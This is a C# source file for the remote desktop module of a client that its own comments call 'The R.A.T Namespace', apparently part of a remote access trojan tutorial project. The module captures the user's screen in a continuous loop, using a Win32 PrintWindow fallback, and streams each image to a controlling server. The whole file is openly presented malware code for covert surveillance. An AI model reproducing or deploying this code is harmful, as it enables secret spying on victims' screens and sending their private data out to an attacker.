using System; //For basic system functions
using System.Threading; //For threads
using System.Drawing.Imaging; //For image conversion
using System.Drawing; //For graphics
using System.Runtime.InteropServices; //For p/invoke
using System.Windows.Forms; //For controls

/// <summary>
/// The R.A.T Namespace
/// </summary>
namespace TutClient
{
    /// <summary>
    /// Remote Desktop Module
    /// </summary>
    class RDesktop
    {
        /// <summary>
        /// True if we want to shutdown the streaming
        /// </summary>
        public static bool isShutdown = false;
        /// <summary>
        /// <see cref="byte"/> and <see cref="Image"/> Converter
        /// </summary>
        private static ImageConverter convert = new ImageConverter();
        /// <summary>
        /// The byte array representation of the image
        /// </summary>
        private static byte[] img;

        /// <summary>
        /// Start sending screen images to the server
        /// </summary>
        public static void StreamScreen()
        {
            while (true) //Infinite loop
            {
                if (isShutdown) //Check if we need to stop
                {
                    break;
                }
                try
                {

                    img = (byte[])convert.ConvertTo(Desktop(), typeof(byte[])); //Convert the desktop image to bytes
                    if (img != null) //If we have an image
                        Program.SendScreen(img); //Send the screen data to the server
                    Array.Clear(img, 0, img.Length); //Clear the bytes array of the image

                    Thread.Sleep(Program.fps); //Use the specified FPS
                }
                catch //Something went wrong
                {
                    isShutdown = true; //Exit the loop
                    break;
                }
            }
        }
        
        /// <summary>
        /// Get the <see cref="Bitmap"/> image of a desktop
        /// </summary>
        /// <returns>The <see cref="Bitmap"/> image of the desktop</returns>
        private static Bitmap Desktop()
        {
            try
            {
                // TODO: remove 2 if statements -> 1 if statement
                if (Program.ScreenNumber == 0) //No other screen specified
                {
                    Rectangle bounds = Screen.PrimaryScreen.Bounds; //Get the size of the screen
                    Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb); //Create a bitmap holder

                    using (Graphics graph = Graphics.FromImage(screenshot)) //Load the holder into graphics
                    {
                        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy); //Take the screenshot
                    }

                    //Free resources
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    Thread.SpinWait(5000);

                    return screenshot; //Return the image of the desktop
                }
                else //A screen is selected
                {
                    //Create a bitmap holder for the specified screen
                    Bitmap bmpScreenshot = new Bitmap(Screen.AllScreens[Program.ScreenNumber].Bounds.Width, Screen.AllScreens[Program.ScreenNumber].Bounds.Height, PixelFormat.Format32bppArgb);
                    using (Graphics graph = Graphics.FromImage(bmpScreenshot)) //Load the holder into Graphics
                    {
                        //Take the screenshot
                        graph.CopyFromScreen(Screen.AllScreens[Program.ScreenNumber].Bounds.X, Screen.AllScreens[1].Bounds.Y, 0, 0, Screen.AllScreens[Program.ScreenNumber].Bounds.Size, CopyPixelOperation.SourceCopy);
                    }

                    //Free resources
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    Thread.SpinWait(5000);

                    return bmpScreenshot; //Return the image of the specified desktop
                }
            }
            catch //Something went wrong
            {
                //Get the handle of the desktop window
                IntPtr desktopHwnd = FindWindowEx(GetDesktopWindow(), IntPtr.Zero, "Progman", "Program Manager");

                // get the desktop dimensions
                var rect = new Rectangle();
                GetWindowRect(desktopHwnd, ref rect);

                // saving the screenshot to a bitmap
                var bmp = new Bitmap(rect.Width, rect.Height);
                Graphics memoryGraphics = Graphics.FromImage(bmp);
                IntPtr dc = memoryGraphics.GetHdc();
                PrintWindow(desktopHwnd, dc, 0);
                memoryGraphics.ReleaseHdc(dc);

                //Free resources
                GC.Collect();
                GC.WaitForPendingFinalizers();
                Thread.SpinWait(5000);
                
                return bmp; //Return the image of the desktop
            }
            
        }

        /// <summary>
        /// Get the image of a window
        /// </summary>
        /// <param name="hwnd">Handle of the window</param>
        /// <param name="hdc">Pointer to the buffer to save the data to</param>
        /// <param name="nFlags">The flags of the print</param>
        /// <returns>The result of the screenshot</returns>
        [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hdc, uint nFlags);
        /// <summary>
        /// Get the rectangle bounds of a window
        /// </summary>
        /// <param name="handle">The handle of the window</param>
        /// <param name="rect">A reference to the Rectangle object to save the data to</param>
        /// <returns>The result of getting the bounds of the window</returns>
        [DllImport("user32.dll")]
        static extern bool GetWindowRect(IntPtr handle, ref Rectangle rect);
        /// <summary>
        /// Get the handle of the desktop window
        /// </summary>
        /// <returns>The handle of the desktop window</returns>
        [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
        static extern IntPtr GetDesktopWindow();
        /// <summary>
        /// Find a child window
        /// </summary>
        /// <param name="parentHandle">The handle of the parent window</param>
        /// <param name="childAfter">The handle of the child to get the child window after</param>
        /// <param name="lclassName">Class name of the window</param>
        /// <param name="windowTitle">Title string of the window</param>
        /// <returns>The handle to the child window</returns>
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

    }
}

